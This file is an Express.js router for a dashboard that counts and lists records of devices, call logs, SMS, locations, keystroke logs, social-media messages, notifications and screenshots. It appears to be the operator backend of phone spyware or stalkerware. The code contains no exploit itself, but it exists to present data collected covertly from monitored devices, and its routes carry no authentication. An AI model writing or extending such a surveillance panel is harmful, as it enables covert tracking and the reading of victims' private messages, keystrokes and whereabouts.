const express = require('express');
const router = express.Router();
const Device = require('../models/Device');
const CallLog = require('../models/CallLog');
const Sms = require('../models/Sms');
const Location = require('../models/Location');
const Keylog = require('../models/Keylog');
const SocialMessage = require('../models/SocialMessage');
const Notification = require('../models/Notification');
const Screenshot = require('../models/Screenshot');

// Dashboard Stats
router.get('/stats', async (req, res) => {
  try {
    const totalDevices = await Device.countDocuments();
    const totalMessages = await Sms.countDocuments();
    const totalCalls = await CallLog.countDocuments();
    const totalLocations = await Location.countDocuments();
    const totalScreenshots = await Screenshot.countDocuments();
    const totalSocial = await SocialMessage.countDocuments();
    const totalNotifications = await Notification.countDocuments();
    res.json({ success: true, stats: { 
      totalDevices, totalMessages, totalCalls, totalLocations, 
      totalScreenshots, totalSocial, totalNotifications 
    } });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

// Recent Activity
router.get('/recent', async (req, res) => {
  try {
    const calls = await CallLog.find().sort({ timestamp: -1 }).limit(10);
    const messages = await Sms.find().sort({ timestamp: -1 }).limit(10);
    const locations = await Location.find().sort({ timestamp: -1 }).limit(10);
    const keylogs = await Keylog.find().sort({ timestamp: -1 }).limit(10);
    const social = await SocialMessage.find().sort({ timestamp: -1 }).limit(10);
    const notifications = await Notification.find().sort({ timestamp: -1 }).limit(10);
    const all = [...calls, ...messages, ...locations, ...keylogs, ...social, ...notifications];
    all.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    res.json({ success: true, data: all.slice(0, 30) });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

module.exports = router;